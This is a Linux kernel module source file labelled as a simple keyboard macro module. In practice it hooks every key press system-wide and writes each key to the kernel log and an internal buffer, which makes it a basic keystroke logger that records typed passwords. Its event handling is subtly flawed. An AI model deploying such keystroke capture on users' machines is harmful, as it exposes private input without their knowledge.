#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h> // defines standard keycodes
#include <linux/hid.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>

#define BUFFER_SIZE 256
static char key_buffer[BUFFER_SIZE];
static int buffer_index = 0;

#define MAX_KEYCODE 255

static const char *keymap[MAX_KEYCODE + 1] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d",
    [KEY_E] = "e", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_I] = "i", [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o", [KEY_P] = "p",
    [KEY_Q] = "q", [KEY_R] = "r", [KEY_S] = "s", [KEY_T] = "t",
    [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",
    [KEY_SPACE] = "SPACE", [KEY_ENTER] = "ENTER", [KEY_ESC] = "ESC",
    [KEY_TAB] = "TAB", [KEY_LEFTSHIFT] = "LSHIFT", [KEY_RIGHTSHIFT] = "RSHIFT",
    [KEY_LEFTCTRL] = "LCTRL", [KEY_RIGHTCTRL] = "RCTRL",
    [KEY_LEFTALT] = "LALT", [KEY_RIGHTALT] = "RALT",
    [KEY_LEFTMETA] = "LWIN", [KEY_RIGHTMETA] = "RWIN",
    [KEY_BACKSPACE] = "BACKSPACE", [KEY_CAPSLOCK] = "CAPSLOCK",
    [KEY_F1] = "F1", [KEY_F2] = "F2", [KEY_F3] = "F3", [KEY_F4] = "F4",
    [KEY_F5] = "F5", [KEY_F6] = "F6", [KEY_F7] = "F7", [KEY_F8] = "F8",
    [KEY_F9] = "F9", [KEY_F10] = "F10", [KEY_F11] = "F11", [KEY_F12] = "F12",
    [KEY_UP] = "UP", [KEY_DOWN] = "DOWN", [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT",
    [KEY_HOME] = "HOME", [KEY_END] = "END", [KEY_PAGEUP] = "PAGEUP", [KEY_PAGEDOWN] = "PAGEDOWN",
    [KEY_INSERT] = "INSERT", [KEY_DELETE] = "DELETE",
};

static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
{
    struct keyboard_notifier_param *kp = param;

    if (kp->down) {
        if (kp->value < 0 || kp->value > MAX_KEYCODE) {
            //pr_err("Invalid keycode: %d\n", kp->value);
            return NOTIFY_OK;
        }

        const char *key_char = keymap[kp->value];
        if (!key_char) {
            pr_info("Key event: unmapped keycode = %d\n", kp->value);
            return NOTIFY_OK;
        }

        // Calculate the space left in the buffer
        int space_left = BUFFER_SIZE - buffer_index - 1; // -1 for null terminator
        int key_char_length = strlen(key_char);

        if (key_char_length < space_left) {
            strncat(key_buffer, key_char, space_left);
            buffer_index += key_char_length;
            key_buffer[buffer_index] = '\0';
        } else {
            pr_info("Not enough space in key buffer\n");
        }

        pr_info("Keycode: %d, Letter: %s\n", kp->value, key_char);
    }

    return NOTIFY_OK;
}

// notifier_call: A function pointer to the callback function that should be called when the notification is triggered.
// In this case, it's set to keyboard_event, which will run whenever a keyboard event is detected.

// instance of notifier_block structure
static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_event
};

static int __init keyboard_macro_init(void)
{
    int ret;

    // Register the keyboard notifier
    ret = register_keyboard_notifier(&keyboard_nb);
    if (ret) {
        pr_err("Failed to register keyboard notifier\n");
        return ret;
    }

    pr_info("Keyboard macro module loaded\n");
    return 0;
}

static void __exit keyboard_macro_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_nb);
    pr_info("Keyboard macro module unloaded\n");
}

module_init(keyboard_macro_init);
module_exit(keyboard_macro_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A simple keyboard macro module");